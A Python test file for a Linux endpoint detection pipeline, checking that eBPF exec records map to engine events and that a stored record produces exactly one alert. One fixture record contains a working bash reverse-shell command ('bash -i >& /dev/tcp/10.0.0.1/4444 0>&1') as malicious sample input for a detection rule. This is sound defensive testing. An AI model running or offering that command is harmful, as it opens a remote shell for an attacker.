"""Linux endpoint records reach the detection engine and produce an alert."""
import json
import sqlite3

from manager import linux_endpoint_store
from manager.detection.linux_mapper import to_engine_event


def _exec_record(args, name="bash", parent="sshd"):
    return {
        "schema_version": "1.0", "record_type": "event", "id": "a" * 32, "seq": 1,
        "type": "process.exec", "time": "2026-10-06T09:12:58.663224890Z",
        "host": {"id": "h" * 32, "boot_id": "b", "hostname": "vm"},
        "sensor": {"id": "s", "version": "0.1.0"},
        "provenance": {"provider": "ebpf", "mechanism": "sched_process_exec", "confidence": "observed"},
        "process": {"entity_id": "e" * 32, "pid": 10, "ppid": 9, "name": name, "start_ticks": 5,
                    "executable": {"path": "/usr/bin/" + name}, "args": args,
                    "creds": {"uid": 1000},
                    "ancestry": [{"entity_id": "p" * 32, "pid": 9, "name": parent}]},
    }


def test_mapper_produces_the_engine_shape():
    event = to_engine_event(_exec_record(["bash", "-c", "echo hi"]))
    assert event["event_type"] == "process_create"
    assert event["process"]["name"] == "bash"
    assert event["process"]["command_line"] == "bash -c echo hi"
    assert event["parent"]["name"] == "sshd"
    assert event["host_id"] == "h" * 32


def test_other_record_types_are_not_mapped():
    record = _exec_record(["x"])
    record["type"] = "file.create"
    assert to_engine_event(record) is None


def test_a_linux_exec_record_becomes_an_alert(tmp_path):
    """Stored endpoint/1.0 record -> worker -> engine rule -> alert row, once."""
    from pathlib import Path
    from manager import migrations
    from manager.detection.worker import DetectionWorker

    db = tmp_path / "p.db"
    conn = sqlite3.connect(db)
    conn.row_factory = sqlite3.Row
    migrations.migrate(conn)
    linux_endpoint_store.ensure_schema(conn)
    rules = Path(__file__).resolve().parent / "fixtures" / "linux_rules"

    def put(record, agent="agent-1"):
        raw = json.dumps(record)
        conn.execute(
            "INSERT INTO linux_endpoint_records (agent_id, record_id, sensor_id, boot_id, seq, "
            "host_id, record_type, type, event_time, ingested_at, digest, raw_json) "
            "VALUES (?,?,?,?,?,?,?,?,?,?,?,?)",
            (agent, record["id"], "s", "b", record["seq"], record["host"]["id"], "event",
             record["type"], record["time"], record["time"], record["id"], raw))
        conn.commit()

    bad = _exec_record(["bash", "-c", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"])
    good = _exec_record(["ls", "/"], name="ls")
    good["id"], good["seq"] = "c" * 32, 2
    put(bad)
    put(good)

    worker = DetectionWorker(db_path=db, alerts_path=tmp_path / "a.ndjson", rules_dir=rules)
    from manager.detection.factory import build_detection_run
    run, sink, writer, _ctx = build_detection_run(conn, alerts_path=tmp_path / "a.ndjson", rules_dir=rules)
    assert worker.run_once(conn, run, sink) == 2
    assert worker.run_once(conn, run, sink) == 0  # nothing is processed twice
    alerts = conn.execute("SELECT rule_id, agent_id, host_id FROM alerts").fetchall()
    assert [(a["rule_id"], a["agent_id"]) for a in alerts] == [("DET-LNX-001", "agent-1")]
    states = {r["record_id"]: r["state"] for r in conn.execute("SELECT * FROM linux_endpoint_detection")}
    assert states == {"a" * 32: "done", "c" * 32: "done"}
    writer.close()
